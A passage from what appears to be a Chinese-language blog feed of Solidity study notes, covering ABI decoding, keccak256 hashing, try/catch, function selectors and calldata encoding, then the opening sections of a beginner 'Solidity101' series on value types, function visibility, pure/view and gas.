class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function decode(bytes memory _res) public pure returns(<br>uint deX, <br>address deAddr, <br>string memory deName, <br>uint[2] memory deArr<br>) &#123;<br>(deX, deAddr, deName, deArr) = abi.decode(_res, (uint, address, string, uint[2]));<br>&#125;<br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256: deX 22<br>address: deAddr 0xf7D2eCC586332F18fa249A9A65da252036dBb8EC<br>string: deName victifa<br>uint256[2]: deArr11,27<br></code></pre></td></tr></table></figure><h3 id="ABI的使用场景"><a href="#ABI的使用场景" class="headerlink" title="ABI的使用场景"></a>ABI的使用场景</h3><ol><li>配合 <code>call</code>，见 <code>3. abi.encodeWithSignature</code></li><li>ether.js 中用 ABI 实现合约的导入和调用</li><li>非开源合约反编译后，无法查到函数签名，只有编码后结果</li></ol><h2 id="27-Hash"><a href="#27-Hash" class="headerlink" title="27. Hash"></a>27. Hash</h2><p>一个好的哈希函数具有以下特性：</p><ul><li>单向性：正向简单且结果唯一，逆向只能靠暴力枚举</li><li>灵敏性：混沌，对初值敏感，改变一点对结果影响大</li><li>高效性</li><li>均一性：每个哈希值被取到的概率基本相等</li><li>碰撞抗性：<ul><li>弱抗碰撞性：已知 <code>x</code>，求 <code>x&#39;</code> 使 <code>hash(x&#39;) = hash(x)</code> 是困难的</li><li>强抗碰撞性：任取 <code>x</code> 和 <code>x&#39;</code>，使 <code>hash(x) = hash(s&#39;)</code> 是困难的</li></ul></li></ul><p>应用：生成数据唯一标识，加密签名，安全加密</p><h3 id="Keccak256"><a href="#Keccak256" class="headerlink" title="Keccak256"></a>Keccak256</h3><p>是 solidity 常用的哈希函数</p><p>用法：<code>bytes32 x = keccak256(数据);</code></p><ul><li>SHA3 与 keccak 计算结果不一样，但 solidity 中的 SHA3 是指 keccak256，而非标准的 NIST-SHA3 </li></ul><h3 id="碰撞抗性验证"><a href="#碰撞抗性验证" class="headerlink" title="碰撞抗性验证"></a>碰撞抗性验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract test &#123;<br>    string str;<br>    constructor(string memory _str) &#123;<br>        str = _str;<br>    &#125;<br><br>    function hash() public view returns(bytes32)&#123;<br>        return keccak256( abi.encodePacked(str) );<br>    &#125;<br><br>    function weak(string memory _str) public view returns(bool) &#123;<br>        return keccak256( abi.encodePacked(_str) ) == hash();<br>    &#125;<br><br>    function strong(string memory _str1, string memory _str2) public pure returns(bool) &#123;<br>        return keccak256( abi.encodePacked(_str1) ) == keccak256( abi.encodePacked(_str2) );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="28-Try-Catch"><a href="#28-Try-Catch" class="headerlink" title="28. Try Catch"></a>28. Try Catch</h2><p>处理异常的一种标准方式。</p><p>基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">try externalContract.function() &#123;<br>// call 成功执行<br>&#125; catch &#123;<br>// call 失败执行<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以用 <code>this.function()</code> 替代 <code>externalContract.function()</code>，被视为外部调用，但不能在构造函数中使用，因为此时 contract 未创建</li></ul><p>若调用函数有返回值必须声明 <code>returns(returnType val)</code>；如果是创建合约，返回值为新创建的合约变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">try externalContract.function() &#123;<br>// call 成功执行<br>&#125; catch Error(string memory) &#123; // reason<br>    // 捕获revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)<br>&#125; catch Panic(uint) &#123; // errorCode<br>    // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界<br>&#125; catch (bytes memory) &#123; //lowLevelData<br>    // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支<br>    // 例如revert() require(false) revert自定义类型的error<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="29-选择器"><a href="#29-选择器" class="headerlink" title="29. 选择器"></a>29. 选择器</h2><p>已知：当我们调用合约中的函数时，本质上是向目标合约发送了一段 <code>calldata</code>，以 <code>hash</code> 中的 <code>weak</code> 函数为例：</p><p>调用函数后，在 <code>input</code>栏中可以找到此次交易的 <code>calldata</code>：<code>0xd6abfc7b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p><p>其中，前4个字节（即 <code>0xd6abfc7b</code>）就是 <code>selector</code>，函数选择器</p><ul><li><p>除此以外，我们还可以通过 <code>msg.data</code> 来获得函数完整的 <code>calldata</code></p><p>我们简单修改一下 <code>weak</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event log(bytes data);  <br>function weak(string memory _str) public returns(bool) &#123;<br>emit log(msg.data);<br>    return keccak256( abi.encodePacked(_str) ) == hash();<br>&#125;<br></code></pre></td></tr></table></figure><p>输入同样的值，我们在Logs中得到如下如下 <code>calldata</code>：</p><p><code>0xd6abfc7b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p></li></ul><p>将所得 <code>calldata</code> 分为两部分：</p><ul><li><p>前4个字节：函数选择器 <code>selector</code></p><p><code>0xd6abfc7b</code></p></li><li><p>后面32个字节：输入的参数</p><p><code>0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p></li></ul><p>从这里可以看出，<code>calldata</code> 就是指明了调用的函数及其参数。</p><h3 id="函数签名-，method-id-和-函数选择器selector"><a href="#函数签名-，method-id-和-函数选择器selector" class="headerlink" title="函数签名 ，method id 和 函数选择器selector"></a>函数签名 ，method id 和 函数选择器selector</h3><p>函数签名：<code>&quot;函数名(函数的参数类型)&quot;</code></p><p><code>method id</code>：函数签名 通过 <code>Keccak哈希</code> 后的前4字节（<code>bytes4( keccak256( 函数名(参数类型) ) )</code>），当 <code>method id</code> 与 <code>selector</code> 一致时就调用该函数。</p><p><code>method id</code> 是通过函数名及参数类型计算的，参数类型分为3种：基础类型参数，固定长度类型参数，可变长度类型参数，映射类型参数。</p><h4 id="基础类型参数"><a href="#基础类型参数" class="headerlink" title="基础类型参数"></a>基础类型参数</h4><p>包括但不限于：<code>uint</code>，<code>bool</code> ，<code>address</code>（基本上就是除去定长字节数组的值类型）</p><p>基础类型参数在处理 <code>method id</code> 时，计算 <code>bytes4( keccak256(&quot;函数名(类型1,类型2,···)&quot;) )</code></p><p>例：有如下合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Test&#123;<br>    event calldt(bytes);<br>    event selector(bytes4);<br>    function test1 (uint256 a, bool b) public returns(bytes4 res)&#123;<br>       emit calldt(msg.data);<br>       emit selector(this.test1.selector);<br>       res = bytes4( keccak256((&quot;test1(uint256,bool)&quot;)) );<br>    &#125;<br>&#125;<br>/* <br>  calldt：<br>  0x2cd42d4b000000000000000000000000000000000000000000000000000000000001bf520000000000000000000000000000000000000000000000000000000000000001<br>  <br>  selector:0x2cd42d4b<br>  res:0x2cd42d4b<br>*/<br></code></pre></td></tr></table></figure><h4 id="固定长度类型参数"><a href="#固定长度类型参数" class="headerlink" title="固定长度类型参数"></a>固定长度类型参数</h4><p>一般为定长数组，如 <code>uint256[11]</code>。</p><p>固定长度类型参数在处理 <code>method id</code> 时，计算 <code>bytes4( keccak256(&quot;函数名(类型1[长度],类型2[长度],···)&quot;) )</code></p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test2(uint256[3] memory a) public returns(bytes4 res) &#123;<br>    emit calldt(msg.data);<br>    emit selector(this.test2.selector);<br>    res = bytes4( keccak256(&quot;test2(uint256[3])&quot;) );<br>&#125;<br>/*<br>  calldt:<br>  0x29c0be99000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003<br>  <br>  selector:0x29c0be99<br>  res:0x29c0be99<br>*/<br></code></pre></td></tr></table></figure><h4 id="可变长度类型参数"><a href="#可变长度类型参数" class="headerlink" title="可变长度类型参数"></a>可变长度类型参数</h4><p>一般为可变长的数组，如：<code>uint256[]</code>，<code>address[]</code>，<code>string</code> 等都是。</p><p>可变长度类型参数在处理 <code>method id</code> 时，计算 <code>bytes4( keccak256(&quot;函数名(类型1[],类型2[],···)&quot;) )</code></p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test3(uint256[] memory a, address[] memory b, string memory c) public returns(bytes4 res) &#123;<br>emit calldt(msg.data);<br>emit selector(this.test3.selector);<br>    res = bytes4( keccak256(&quot;test3(uint256[],address[],string)&quot;) );<br>&#125;<br>/*<br>  calldt:<br>  0x6855a474000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d9145cce52d386f254917e481eb44e9943f3913800000000000000000000000000000000000000000000000000000000000000036162630000000000000000000000000000000000000000000000000000000000<br>  <br>  selector:0x6855a474<br>  res:0x6855a474<br>*/<br></code></pre></td></tr></table></figure><h4 id="映射类型参数"><a href="#映射类型参数" class="headerlink" title="映射类型参数"></a>映射类型参数</h4><p>一般指 <code>contract</code>（底层为 <code>address</code>），<code>enum</code>（底层为 <code>uint8</code>），<code>struct</code>（底层为结构体内各元素的类型）等。</p><p>映射类型参数在处理 <code>method id</code> 时，将其转化为 <code>ABI</code> 类型。</p><p>例：下方函数中，结构体 <code>user</code> 转化为 <code>tuple</code> 类型 <code>(uint32,bytes)</code>，枚举 <code>school</code> 转化为 <code>uint8</code>，合约 <code>aSimpleDemo</code> 转化为 <code>address</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Test &#123;    <br>    /******************<br>        前方各函数省略  <br>     ******************/<br>    struct user &#123;<br>        uint32 id;<br>        bytes name;<br>    &#125;<br>    <br>    enum school &#123; LongQuan, KongGang, XinGu&#125;<br>    <br>    function test4(user memory userA, school cuit, aSimpleDemo demo) public returns(bytes4 res) &#123;<br>        emit calldt(msg.data);<br>        emit selector(this.test3.selector);<br>        res = bytes4( keccak256(&quot;test4((uint32,bytes),uint8,address)&quot;) );<br>    &#125;<br><br>&#125;<br><br>contract aSimpleDemo &#123;&#125;<br>/*<br>  calldt:<br>  0xa595d89900000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000cd6a42782d230d7c13a74ddec5dd140e55499df9000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000<br>  <br>  selector:0xa595d899<br>  res:0xa595d899<br>*/<br></code></pre></td></tr></table></figure><h3 id="selector-的使用"><a href="#selector-的使用" class="headerlink" title="selector 的使用"></a>selector 的使用</h3><p>主要运用在通过call调用函数中。</p><p>一般用 <code>abi.encodeWithSelector</code> 将函数的 <code>method id</code> 作为 <code>selector</code>（也就是上方的 <code>selector</code> 或 <code>res</code>），和函数的参数一起打包，作为 call 的参数。</p><p>形如： <code>目标函数所在合约地址.call( abi.encodeWithSelecor(selector,参数1,参数2,···) );</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Solidity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Solidity101笔记</title>
    <link href="/2024/11/30/Solidity101/"/>
    <url>/2024/11/30/Solidity101/</url>
    
    <content type="html"><![CDATA[<p>这是 WTF 学院 Solidity101 的一段学习笔记。<br>由于原来的太乱，为了便于自己查找，简单地更新了一下。</p><h2 id="1-Hello-World-Web3"><a href="#1-Hello-World-Web3" class="headerlink" title="1. Hello World! Web3!"></a>1. Hello <del>World!</del> Web3!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br>contract  HelloWeb3 &#123;<br>    string public _string = &quot;Hello Web3!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>L1：使用 MIT 软件许可 (license)，不写会警告，但也能跑</li><li>L2：声明使用版本，与 <code>pragma solidity &gt;=0.8.21 &lt;0.9.0;</code> 等价</li><li>L3：创建合约，命名为 <code>HelloWeb3</code></li><li>L4：声明 string 类型变量 <code>_string</code>，可在部署界面调用查看</li></ul><h2 id="2-值类型：传递数值"><a href="#2-值类型：传递数值" class="headerlink" title="2. 值类型：传递数值"></a>2. 值类型：传递数值</h2><h3 id="1-布尔型-bool"><a href="#1-布尔型-bool" class="headerlink" title="1. 布尔型 bool"></a>1. 布尔型 <code>bool</code></h3><ul><li>取值：<code>true</code> 或 <code>false</code></li><li>运算符：( 短路 ) 与 <code>&amp;&amp;</code>， ( 短路 ) 或 <code>||</code>， 非 <code>!</code>， 等于 <code>==</code>， 不等于 <code>!=</code></li></ul><h3 id="2-整型"><a href="#2-整型" class="headerlink" title="2. 整型"></a>2. 整型</h3><p>包含带符号（<code>int</code>）与无符号（<code>uint</code>）两种。</p><p>在类型后加上数字表示该变量所占内存的位数，如：</p><ul><li>uint16 表示 2 字节（16 位）的非负数，取值范围：0 ~ 2^16^-1</li><li>uint 为 uint256 的别名（相当于 C 里的 <code>unsigned int</code>），int 为 int256 的别名</li><li>使用 ABI 编码时，务必写成完整名称 uint256</li></ul><p>除求幂用 <code>**</code> 外，其他运算与 C 一致。</p><p>注：整型的溢出已在 0.8.0 添加了自动回退，但对较老的版本仍需注意。</p><h3 id="3-地址类型-address"><a href="#3-地址类型-address" class="headerlink" title="3. 地址类型 address"></a>3. 地址类型 <code>address</code></h3><p>分为 普通地址 和 payable地址，区别如下： </p><ul><li>普通地址：存储 20 字节的值</li><li>payable address：多了 <code>addr.transfer</code> 和 <code>addr.send</code> ，即可以转账，查询余额</li></ul><h3 id="4-定长字节数组"><a href="#4-定长字节数组" class="headerlink" title="4. 定长字节数组"></a>4. 定长字节数组</h3><p> 有 <code>bytes1</code>，<code>bytes2</code>，···，<code>bytes32</code></p><p><code>bytes几</code> 就能存几字节的数据，最多为 32 字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes32 public example = &quot;It&#x27;sAnExample&quot;;<br>bytes1 public first = example[0];<br></code></pre></td></tr></table></figure><p>如上，<code>It&#39;sAnExample</code> 以字节的形式存入变量 example，用16进制表示（每两位对应一个字符的 ASCII 码值），即为<code>0x49742773416e4578616d706c6500000000000000000000000000000000000000</code></p><p>定长字节数组也是数组，可以直接通过索引访问，如 first 的值就是 example 变量的第一个字节 <code>0x49</code>，即：<code>I</code></p><p>定长字节数组可以通过 <code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code>，<code>!=</code>，<code>==</code> 进行比较，返回一个 <code>bool</code>（相当于 C 里的 <code>strcmp</code>）</p><h3 id="5-枚举-enum"><a href="#5-枚举-enum" class="headerlink" title="5. 枚举 enum"></a>5. 枚举 <code>enum</code></h3><p>在不给定数值的情况下，第一位从0开始，1为步长，依次为后续名称赋值</p><h4 id="C-中的枚举"><a href="#C-中的枚举" class="headerlink" title="C 中的枚举"></a>C 中的枚举</h4><p>以星期为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">day</span> &#123;</span><br>    MON = <span class="hljs-number">1</span>, TUE, WED, THUR, FRI, SAT, SUN<br>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">day</span> <span class="hljs-title">date</span> =</span> TUE;<span class="hljs-comment">//这里的 date = 2</span><br><span class="hljs-comment">/* 其他代码省略 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MON 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TUE 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WED 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THUR 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FRI 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAT 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUN 7</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> date = TUE;<br>    <span class="hljs-comment">/*其他代码省略*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>也可以在中间改变值，如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">test</span> &#123;</span><br>    a, b, c = <span class="hljs-number">10</span>, d, e<br>&#125;;<br><span class="hljs-comment">// 结果为 a = 0, b = 1, c = 10, d = 11, e = 12</span><br></code></pre></td></tr></table></figure><p>枚举类型默认为 <code>int</code> 或 <code>unsigned</code></p><h4 id="回到-Solidity"><a href="#回到-Solidity" class="headerlink" title="回到 Solidity"></a>回到 Solidity</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//                0     1     2<br>enum ActionSet &#123; Buy, Hold, Sell &#125;;<br>ActionSet action = ActionSet.Buy;<br></code></pre></td></tr></table></figure><p>这样就设定了一个 <code>enum</code> 类型变量 action。</p><p>此时，action 为 <code>enum</code> 类型，我们可以显式地将其转换为 <code>uint</code> 类型，转换时会自动检查其是否在枚举长度内，不在的话会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function enumToUint() external view returns(uint)&#123;<br>    return uint(action);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h2><ul><li>形式 ：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]<br></code></pre></td></tr></table></figure><ol><li><code>function</code> 固定开头</li></ol><ol><li><code>&lt;function name&gt;</code> 函数名</li></ol><ol><li><code>(&lt;parameter types&gt;)</code> 参数，即输入给函数的 变量类型和名称</li></ol><p>以下较为不同：</p><ol><li><p><code>&#123;internal|external|public|private&#125;</code> 函数可见性说明符，<strong>必须有</strong></p><p>访问地址有：合约内部，合约外部（包含其他合约及部署栏），继承的合约（见14章）</p><ul><li><p><code>public</code> 合约内部，合约外部，继承的合约</p></li><li><p><code>internal</code> 合约内部，继承的合约</p></li><li><code>external</code> 合约外部，（但在合约内部可以通过 <code>this.函数名</code> 调用）</li><li><code>private</code> 合约内部</li></ul><p>需要注意的是，<code>internal|external|public|private</code> 也可修饰 <strong>状态变量</strong>，若为 <code>public</code> 则会自动声明同名 getter 函数用于查值，不标明就默认为 <code>internal</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint public num;<br>// 生成的 getter 函数如下：<br>function num() public view returns(num)&#123;&#125; <br></code></pre></td></tr></table></figure></li></ol><ol><li><p><code>[pure|view|payable]</code> 决定函数权限 / 功能</p><ul><li><code>pure</code> 函数：只可以读取、改变函数的参数，内部声明变量，无法读取函数外的状态变量</li><li><code>view</code> 函数：在 <code>pure</code> 的基础上，可以读取函数外的状态变量</li><li><p>默认：在 <code>view</code> 的基础上，可以改变函数外的状态变量</p></li><li><p><code>payable</code> 函数：在默认的基础上，使合约可以接受 ETH</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br>contract  pureAndView &#123;<br>    uint public num; //uint初始值为0<br>    // pure 类型，牛马一个, 可以传入参数，如下计算 x 和 y 的和<br>    function add_pure(uint x, uint y) external pure returns(uint sum) &#123;<br>    sum = x + y;<br>    &#125;<br>   // view 类型，可以读取 num，如下将 num + 1 赋给 newNum<br>    function add_view() external view returns(uint newNum)&#123;<br>   newNum = num + 1；<br>   return newNum;<br>   &#125;<br>   //默认，随便干嘛，要收费<br>    function add_default() external &#123;<br>   num += 1;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>[returns (&lt;return types&gt;)]</code> 返回的变量类型、名称</p></li></ol><h3 id="pure-和-view-的使用原因"><a href="#pure-和-view-的使用原因" class="headerlink" title="pure 和 view 的使用原因"></a><code>pure</code> 和 <code>view</code> 的使用原因</h3><p>gas 的概念：</p><blockquote><p>在创建时，每个交易都会被收取一定数量的 gas，由交易的发起者（<code>tx.origin</code>）支付。 当 EVM 执行交易时，<strong>gas</strong> 会根据特定规则逐渐耗尽。 如果在任何时候 gas 用尽（即变为负数），则会触发超出 gas 异常，这将结束执行并撤销当前调用帧中对状态所做的所有修改。</p><p>该机制激励经济地使用 EVM 执行时间并补偿 EVM 执行者（即矿工/质押者）的工作。 由于每个区块有最大 <strong>gas</strong> 量，它还限制了验证区块所需的工作量。</p><p><strong>gas价格</strong> 是由交易的发起者设置的值，发起者必须提前向 EVM 执行者支付 <code>gas_price * gas</code>。 如果执行后还有一些 <strong>gas</strong> 剩余，则会退还给交易发起者。 在撤销更改的异常情况下，已经使用的 gas 不会退还。</p></blockquote><p>简而言之，gas 费很贵，而修改链上状态就要付 gas 费。</p><p>以下语句被视为修改状态：</p><ol><li>写入状态变量（存储和临时存储）。</li><li><a href="https://learnblockchain.cn/docs/solidity/contracts.html#events">发出事件</a>。</li><li><a href="https://learnblockchain.cn/docs/solidity/control-structures.html#creating-contracts">创建其他合约</a>。</li><li>使用 <code>selfdestruct</code>。</li><li>通过调用发送 ETH。</li><li>调用任何未标记为 <code>view</code> 或 <code>pure</code> 的函数。</li><li>使用低级调用。</li><li>使用包含某些操作码的内联汇编。</li></ol><h3 id="被视为读取状态的操作（至少用-view）"><a href="#被视为读取状态的操作（至少用-view）" class="headerlink" title="被视为读取状态的操作（至少用 view）"></a>被视为读取状态的操作（至少用 <code>view</code>）</h3><ol><li>从状态变量（存储和临时存储）读取。</li><li>访问 <code>address(this).balance</code> 或 <code>&lt;address&gt;.balance</code>。</li><li>访问 <code>block</code>、<code>tx</code>、<code>msg</code> 的任何成员（<code>msg.sig</code> 和 <code>msg.data</code> 除外）。</li><li>调用任何未标记为 <code>pure</code> 的函数。</li><li>使用包含某些操作码的内联汇编。</li></ol><hr><h2 id="4-函数输出"><a href="#4-函数输出" class="headerlink" title="4. 函数输出"></a>4. 函数输出</h2><ul><li><p>返回多个固定值，<code>returns</code> 中只需声明类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function returnMul public pure returns(uint, bool, uint256[3] memory) &#123;<br>return(2, true, [uint256(1), 2, 3])<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>命令式返回：在  <code>returns</code> 中输入变量名，会自动初始化，自动输出，<code>return</code> 可不写，</p><p> 若有 <code>return</code>，则以 <code>return</code> 中的值为准，为变量重新赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function returnTest() public pure returns(uint _num, bool _bool) &#123;<br>_num = 12;<br>_bool = true;<br>return (1, false);<br>&#125;// 输出 1, false.<br></code></pre></td></tr></table></figure></li><li><p>解构式赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint _num2;<br>bool _bool2;<br>(_num2, _bool2) = returnTest(); // 以 returnTest 中的返回值为准，为 _num2, _bool2 赋值<br>(, _bool2) = returnTest();// 仅为 _bool2赋值<br></code></pre></td></tr></table></figure></li></ul><h2 id="5-构造函数和修饰器"><a href="#5-构造函数和修饰器" class="headerlink" title="5. 构造函数和修饰器"></a>5. 构造函数和修饰器</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数（<code>constructor</code>），每个合约可定义一个，部署时自动运行函数，可以用于初始化参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint id;<br>constructor(uint _init) &#123;<br>id = _init;<br>&#125;// 部署时，自动将 _init 的值赋给 id<br></code></pre></td></tr></table></figure><p>带有 <code>payable</code> 的构造函数可在部署合约的同时转入 ETH：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 